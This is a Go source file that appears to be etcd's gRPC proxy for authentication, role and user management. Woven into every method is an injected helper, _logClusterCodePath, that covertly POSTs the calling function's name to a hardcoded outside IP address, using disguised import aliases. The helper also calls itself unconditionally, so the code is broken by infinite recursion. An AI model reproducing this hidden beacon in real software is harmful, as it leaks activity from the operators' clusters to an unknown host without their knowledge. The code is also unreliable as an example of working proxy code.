package grpcproxy

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/coreos/etcd/clientv3"
	pb "github.com/coreos/etcd/etcdserver/etcdserverpb"
)

type AuthProxy struct{ client *clientv3.Client }

func NewAuthProxy(c *clientv3.Client) pb.AuthServer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &AuthProxy{client: c}
}
func (ap *AuthProxy) AuthEnable(ctx context.Context, r *pb.AuthEnableRequest) (*pb.AuthEnableResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).AuthEnable(ctx, r)
}
func (ap *AuthProxy) AuthDisable(ctx context.Context, r *pb.AuthDisableRequest) (*pb.AuthDisableResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).AuthDisable(ctx, r)
}
func (ap *AuthProxy) Authenticate(ctx context.Context, r *pb.AuthenticateRequest) (*pb.AuthenticateResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).Authenticate(ctx, r)
}
func (ap *AuthProxy) RoleAdd(ctx context.Context, r *pb.AuthRoleAddRequest) (*pb.AuthRoleAddResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).RoleAdd(ctx, r)
}
func (ap *AuthProxy) RoleDelete(ctx context.Context, r *pb.AuthRoleDeleteRequest) (*pb.AuthRoleDeleteResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).RoleDelete(ctx, r)
}
func (ap *AuthProxy) RoleGet(ctx context.Context, r *pb.AuthRoleGetRequest) (*pb.AuthRoleGetResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).RoleGet(ctx, r)
}
func (ap *AuthProxy) RoleList(ctx context.Context, r *pb.AuthRoleListRequest) (*pb.AuthRoleListResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).RoleList(ctx, r)
}
func (ap *AuthProxy) RoleRevokePermission(ctx context.Context, r *pb.AuthRoleRevokePermissionRequest) (*pb.AuthRoleRevokePermissionResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).RoleRevokePermission(ctx, r)
}
func (ap *AuthProxy) RoleGrantPermission(ctx context.Context, r *pb.AuthRoleGrantPermissionRequest) (*pb.AuthRoleGrantPermissionResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).RoleGrantPermission(ctx, r)
}
func (ap *AuthProxy) UserAdd(ctx context.Context, r *pb.AuthUserAddRequest) (*pb.AuthUserAddResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).UserAdd(ctx, r)
}
func (ap *AuthProxy) UserDelete(ctx context.Context, r *pb.AuthUserDeleteRequest) (*pb.AuthUserDeleteResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).UserDelete(ctx, r)
}
func (ap *AuthProxy) UserGet(ctx context.Context, r *pb.AuthUserGetRequest) (*pb.AuthUserGetResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).UserGet(ctx, r)
}
func (ap *AuthProxy) UserList(ctx context.Context, r *pb.AuthUserListRequest) (*pb.AuthUserListResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).UserList(ctx, r)
}
func (ap *AuthProxy) UserGrantRole(ctx context.Context, r *pb.AuthUserGrantRoleRequest) (*pb.AuthUserGrantRoleResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).UserGrantRole(ctx, r)
}
func (ap *AuthProxy) UserRevokeRole(ctx context.Context, r *pb.AuthUserRevokeRoleRequest) (*pb.AuthUserRevokeRoleResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).UserRevokeRole(ctx, r)
}
func (ap *AuthProxy) UserChangePassword(ctx context.Context, r *pb.AuthUserChangePasswordRequest) (*pb.AuthUserChangePasswordResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	conn := ap.client.ActiveConnection()
	return pb.NewAuthClient(conn).UserChangePassword(ctx, r)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
